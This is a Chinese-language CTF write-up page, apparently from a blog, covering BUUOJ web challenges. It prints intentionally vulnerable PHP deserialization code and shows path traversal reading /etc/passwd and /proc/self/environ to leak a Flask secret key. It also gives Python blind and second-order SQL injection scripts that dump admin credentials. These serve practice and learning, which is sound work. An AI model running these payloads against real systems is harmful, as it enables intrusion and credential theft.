<h2 id="EIS-2019-EzPOP"><a href="#EIS-2019-EzPOP" class="headerlink" title="[EIS 2019]EzPOP"></a>[EIS 2019]EzPOP</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$store</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$key</span>;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$expire</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$store</span>, <span class="hljs-variable">$key</span> = <span class="hljs-string">&#x27;flysystem&#x27;</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;key = <span class="hljs-variable">$key</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;store = <span class="hljs-variable">$store</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;expire = <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">cleanContents</span>(<span class="hljs-params"><span class="hljs-keyword">array</span> <span class="hljs-variable">$contents</span></span>) </span>&#123;<br>        <span class="hljs-variable">$cachedProperties</span> = <span class="hljs-title function_ invoke__">array_flip</span>([<br>            <span class="hljs-string">&#x27;path&#x27;</span>, <span class="hljs-string">&#x27;dirname&#x27;</span>, <span class="hljs-string">&#x27;basename&#x27;</span>, <span class="hljs-string">&#x27;extension&#x27;</span>, <span class="hljs-string">&#x27;filename&#x27;</span>,<br>            <span class="hljs-string">&#x27;size&#x27;</span>, <span class="hljs-string">&#x27;mimetype&#x27;</span>, <span class="hljs-string">&#x27;visibility&#x27;</span>, <span class="hljs-string">&#x27;timestamp&#x27;</span>, <span class="hljs-string">&#x27;type&#x27;</span>,<br>        ]);<br><br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$contents</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$path</span> =&gt; <span class="hljs-variable">$object</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$object</span>)) &#123;<br>                <span class="hljs-variable">$contents</span>[<span class="hljs-variable">$path</span>] = <span class="hljs-title function_ invoke__">array_intersect_key</span>(<span class="hljs-variable">$object</span>, <span class="hljs-variable">$cachedProperties</span>);<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getForStorage</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$cleaned</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">cleanContents</span>(<span class="hljs-variable">$this</span>-&gt;cache);<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">json_encode</span>([<span class="hljs-variable">$cleaned</span>, <span class="hljs-variable">$this</span>-&gt;complete]);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">save</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$contents</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getForStorage</span>();<br><br>        <span class="hljs-variable language_">$this</span>-&gt;store-&gt;<span class="hljs-title function_ invoke__">set</span>(<span class="hljs-variable">$this</span>-&gt;key, <span class="hljs-variable">$contents</span>, <span class="hljs-variable">$this</span>-&gt;expire);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-keyword">if</span> (!<span class="hljs-variable language_">$this</span>-&gt;autosave) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">save</span>();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getExpireTime</span>(<span class="hljs-params"><span class="hljs-variable">$expire</span></span>): <span class="hljs-title">int</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">int</span>) <span class="hljs-variable">$expire</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getCacheKey</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> <span class="hljs-variable">$name</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;prefix&#x27;</span>] . <span class="hljs-variable">$name</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">serialize</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>): <span class="hljs-title">string</span> </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_numeric</span>(<span class="hljs-variable">$data</span>)) &#123;<br>            <span class="hljs-keyword">return</span> (<span class="hljs-keyword">string</span>) <span class="hljs-variable">$data</span>;<br>        &#125;<br><br>        <span class="hljs-variable">$serialize</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;serialize&#x27;</span>];<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$serialize</span>(<span class="hljs-variable">$data</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>, <span class="hljs-variable">$value</span>, <span class="hljs-variable">$expire</span> = <span class="hljs-literal">null</span></span>): <span class="hljs-title">bool</span></span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;writeTimes++;<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$expire</span>)) &#123;<br>            <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;expire&#x27;</span>];<br>        &#125;<br><br>        <span class="hljs-variable">$expire</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getExpireTime</span>(<span class="hljs-variable">$expire</span>);<br>        <span class="hljs-variable">$filename</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">getCacheKey</span>(<span class="hljs-variable">$name</span>);<br><br>        <span class="hljs-variable">$dir</span> = <span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-variable">$filename</span>);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>)) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>, <span class="hljs-number">0755</span>, <span class="hljs-literal">true</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (\<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>) &#123;<br>                <span class="hljs-comment">// 创建失败</span><br>            &#125;<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$value</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;options[<span class="hljs-string">&#x27;data_compress&#x27;</span>] &amp;&amp; <span class="hljs-title function_ invoke__">function_exists</span>(<span class="hljs-string">&#x27;gzcompress&#x27;</span>)) &#123;<br>            <span class="hljs-comment">//数据压缩</span><br>            <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">gzcompress</span>(<span class="hljs-variable">$data</span>, <span class="hljs-number">3</span>);<br>        &#125;<br><br>        <span class="hljs-variable">$data</span> = <span class="hljs-string">&quot;&lt;?php\n//&quot;</span> . <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&#x27;%012d&#x27;</span>, <span class="hljs-variable">$expire</span>) . <span class="hljs-string">&quot;\n exit();?&gt;\n&quot;</span> . <span class="hljs-variable">$data</span>;<br>        <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;src&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&quot;uploads/&quot;</span>;<br><br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$dir</span>))<br>&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>]);<br><br></code></pre></td></tr></table></figure>



<h2 id="PASECA2019-honey-shop"><a href="#PASECA2019-honey-shop" class="headerlink" title="[PASECA2019]honey_shop"></a>[PASECA2019]honey_shop</h2><p>商店类型题目，一开始有1336，1337才能购买<code>flag</code>:</p>
<p><img src="/img/ctfhoneyshop1.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop1"></p>
<p>右键没啥有用的信息，先抓包看下<code>cookie</code>:</p>
<p><img src="/img/ctfhoneyshop2.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop2"></p>
<p>看到里面混着小数点觉得有点像<code>JWT</code>，解密一下看看：</p>
<p><img src="/img/ctfhoneyshop3.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop3"></p>
<p>还有个图片下载功能，这里很容易想到任意文件下载，不过要下载啥是个问题。。</p>
<p><img src="/img/ctfhoneyshop4.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop4"></p>
<p><code>../../etc/passwd</code></p>
<p><img src="/img/ctfhoneyshop5.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop5"></p>
<p>好像没乱用。。尝试下载<code>app.py</code>发现回显<code>not allowed</code></p>
<p>后面看了下<code>wp</code>发现要读<code>/proc/self/environ</code>这东西：</p>
<p><code>download?image=../../proc/self/environ</code></p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/proc/</span>self<br><span class="hljs-regexp">//</span> 其路径指向当前进程<br><br>/environ<br><span class="hljs-regexp">//</span> 记录当前进程的环境变量信息<br></code></pre></td></tr></table></figure>

<p><code>SECRET_KEY=ijbufup9Ma6ZKnCWzvhodHqVjNMPk6Nw4NTNnbdr</code></p>
<p>然后<code>flask-unsign</code>解密再加密就行。</p>
<p><img src="/img/ctfhoneyshop6.png" srcset="/img/loading.gif" lazyload alt="ctfhoneyshop6"></p>
<h4 id="思路总结：-2"><a href="#思路总结：-2" class="headerlink" title="思路总结："></a>思路总结：</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">https:<span class="hljs-regexp">//</span>www.anquanke.com<span class="hljs-regexp">/post/i</span>d/<span class="hljs-number">241148</span><span class="hljs-comment">#h2-1</span><br></code></pre></td></tr></table></figure>

<p>上面那个主要是对<code>proc</code>目录的一些解释。</p>
<p>还有<code>secret_key</code>可以放在环境变量里。</p>
<h2 id="Black-Watch-入群题-Web"><a href="#Black-Watch-入群题-Web" class="headerlink" title="[Black Watch 入群题]Web"></a>[Black Watch 入群题]Web</h2><p>登录界面用户名和密码是明文传输：</p>
<p><img src="/img/blackwatch1.png" srcset="/img/loading.gif" lazyload alt="blackwatch1"></p>
<p>热点界面抓包如下：</p>
<p><img src="/img/blackwatch2.png" srcset="/img/loading.gif" lazyload alt="blackwatch2"></p>
<p><code>id</code>这个东西看着像注入点，后面加了个<code>#</code>试了下发现正常回显，加<code>--+</code>回显<code>big big hack hack</code>。<code>FUZZ</code>下：</p>
<p><img src="/img/blackwatch3.png" srcset="/img/loading.gif" lazyload alt="blackwatch3"></p>
<p>这些被过滤了。</p>
<p>试了试什么类型的注入，这东西不会报错，如果存在错误它会回显这么个东西：</p>
<p><img src="/img/blackwatch4.png" srcset="/img/loading.gif" lazyload alt="blackwatch4"></p>
<p>简单布尔盲注：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://9b4209a2-7433-46b6-9b61-e30207ddf793.node5.buuoj.cn:81/backend/content_detail.php&#x27;</span><br>result=<span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">100</span>):<br>    low=<span class="hljs-number">31</span><br>    high=<span class="hljs-number">127</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br>    <span class="hljs-keyword">while</span> low&lt;=high:<br><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆库：news</span><br>        <span class="hljs-comment">#payload = &quot;if(Ascii(Substr((Select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;news&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid)#爆表：admin,contents</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;admin&#x27;)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆字段：id,username,password,is_enable</span><br>        <span class="hljs-comment">#payload = &quot;if(ascii(substr((select(group_concat(username))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;.format(i,mid) #爆数据 15cadb68,f4fc64e0</span><br>        payload = <span class="hljs-string">&quot;if(ascii(substr((select(group_concat(password))from(admin)),&#123;&#125;,1))&gt;&#123;&#125;,1,0)&quot;</span>.<span class="hljs-built_in">format</span>(i,mid) <span class="hljs-comment">#爆数据 07ab9020,43dc2dd9</span><br>        r = requests.get(url+<span class="hljs-string">&quot;?id=&quot;</span>+payload)<br>        <span class="hljs-comment">#r = requests.get(url=url,params=paylaod)</span><br>        time.sleep(<span class="hljs-number">0.03</span>)<br>        <span class="hljs-comment">#print(r.text)</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-keyword">in</span> r.text):<br>            low = mid+<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid-<span class="hljs-number">1</span><br>            mid = (low+high)//<span class="hljs-number">2</span><br>    result+=<span class="hljs-built_in">chr</span>(high+<span class="hljs-number">1</span>)<br>    <span class="hljs-built_in">print</span>(result)<br>    time.sleep(<span class="hljs-number">0.03</span>)<br></code></pre></td></tr></table></figure>

<p>好像挂着<code>VPN</code>不会出乱码？</p>
<h4 id="思路总结：-3"><a href="#思路总结：-3" class="headerlink" title="思路总结："></a>思路总结：</h4><p>简单布尔盲注</p>
<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>抓包：</p>
<p><img src="/img/onlineproxy1.png" srcset="/img/loading.gif" lazyload alt="onlineproxy1"></p>
<p>回显存在<code>IP</code>，伪造一个？</p>
<p><img src="/img/onlineproxy2.png" srcset="/img/loading.gif" lazyload alt="onlineproxy2"></p>
<p>新<code>IP</code>会把旧的顶掉。这里最开始想到是二次注入了，但是输入<code>1&#39; or &#39;1 </code>后再打一个新<code>IP</code>发现这个<code>1&#39; or &#39;1</code>LASTIP并没变成<code>1</code>。</p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_54929891/article/details/124464795">参考资料</a></p>
<blockquote>
<p>第一次输入1’or’1’&#x3D;’1的时候会直接显示出来<br>第二次输入2，因为和第一次输入不同，于是第一次输入存入到数据库中，并显示在Last ip中<br>第三次输入2，因为和第二次输入相同，相当于模拟的ip不再变化，因此这个时候会在数据库中查找ip2的last ip，执行了查询操作，因此这个地方是我们的利用点了</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding:utf-8</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br>url = <span class="hljs-string">&#x27;http://node4.buuoj.cn:28219/&#x27;</span><br> <br>res = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-built_in">print</span>(i)<br>    left = <span class="hljs-number">31</span><span class="hljs-comment">#二分法快速查找关键字</span><br>    right = <span class="hljs-number">127</span><br>    mid = left + ((right - left)&gt;&gt;<span class="hljs-number">1</span>)<br>    <span class="hljs-keyword">while</span> left &lt; right:<span class="hljs-comment">#盲注，利用substr将查询到的字符切割，用ascii函数转化为ascii码，利用二分法的中间值比大小直到查询成功</span><br>        <span class="hljs-comment">#payload = &quot;0&#x27; or (ascii(substr((select group_concat(schema_name) from information_schema.schemata),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema = &#x27;F4l9_D4t4B45e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        <span class="hljs-comment">#payload  = &quot;0&#x27; or (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name = &#x27;F4l9_t4b1e&#x27;),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;.format(i,mid)</span><br>        payload = <span class="hljs-string">&quot;0&#x27; or (ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),&#123;&#125;,1))&gt;&#123;&#125;) or &#x27;0&quot;</span>.<span class="hljs-built_in">format</span>(i,mid)<br>        headers = &#123;<span class="hljs-comment">#第一次请求，是用我们的payload，防止cookie被刷新因此我们头部请求的时候必须要带上cookie</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<span class="hljs-comment">#带cookie防止刷新重置</span><br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<span class="hljs-comment">#头文件传输方法</span><br> <br>        payload = <span class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<span class="hljs-comment">#后面就是相同cookie的二次三次输入，只为了执行第一次payload的查询语句</span><br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br>        payload = <span class="hljs-string">&#x27;111&#x27;</span><br>        headers = &#123;<br>                    <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">&#x27;track_uuid=6e17fe5e-140c-4138-dea6-d197aa6214e3&#x27;</span>,<br>                    <span class="hljs-string">&#x27;X-Forwarded-For&#x27;</span>: payload<br>                    &#125;<br>        r = requests.post(url = url, headers = headers)<br> <br> <br>        <span class="hljs-keyword">if</span> r.status_code == <span class="hljs-number">429</span>:<span class="hljs-comment">#buu特色</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;too fast&#x27;</span>)<br>            time.sleep(<span class="hljs-number">2</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span>  <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#payload语句用的都是大于，如果大于中值，则中值加一赋给最小值</span><br>            left = mid + <span class="hljs-number">1</span><br>        <span class="hljs-keyword">elif</span> <span class="hljs-string">&#x27;Last Ip: 1&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> r.text:<span class="hljs-comment">#不小于则中值给最大值</span><br>            right = mid<br>        mid = left + ((right-left)&gt;&gt;<span class="hljs-number">1</span>)<span class="hljs-comment">#右移1，代表除2 可以直接mid=（left +right）//2</span><br>    <span class="hljs-keyword">if</span> mid == <span class="hljs-number">31</span> <span class="hljs-keyword">or</span> mid == <span class="hljs-number">127</span>:<br>        <span class="hljs-keyword">break</span><br>    res += <span class="hljs-built_in">chr</span>(mid)<span class="hljs-comment">#chr函数。ascii转化为字符</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(mid),res)<br>    time.sleep(<span class="hljs-number">1</span>)<br><span class="hljs-comment"># information_schema,ctftraining,mysql,performance_schema,test,ctf,F4l9_D4t4B45e</span><br><span class="hljs-comment">#F4l9_t4b1e</span><br><span class="hljs-comment">#F4l9_C01uMn</span><br></code></pre></td></tr></table></figure>



<h2 id="GWCTF-2019-mypassword-环境有问题，留着"><a href="#GWCTF-2019-mypassword-环境有问题，留着" class="headerlink" title="[GWCTF 2019]mypassword(环境有问题，留着)"></a>[GWCTF 2019]mypassword(环境有问题，留着)</h2><p>login.js:</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>	<span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;; &#x27;</span>);<br>	<span class="hljs-keyword">var</span> cookie = &#123;&#125;;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br>		<span class="hljs-keyword">var</span> arr = cookies[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br>		<span class="hljs-keyword">var</span> key = arr[<span class="hljs-number">0</span>];<br>		cookie[key] = arr[<span class="hljs-number">1</span>];<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;user&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span> &amp;&amp; <span class="hljs-title function_">typeof</span>(cookie[<span class="hljs-string">&#x27;psw&#x27;</span>]) != <span class="hljs-string">&quot;undefined&quot;</span>)&#123;<br>		<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;username&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;user&#x27;</span>];<br>		<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementsByName</span>(<span class="hljs-string">&quot;password&quot;</span>)[<span class="hljs-number">0</span>].<span class="hljs-property">value</span> = cookie[<span class="hljs-string">&#x27;psw&#x27;</span>];<br>	&#125;<br>&#125;<br></code></pre></td></tr></table></figure>

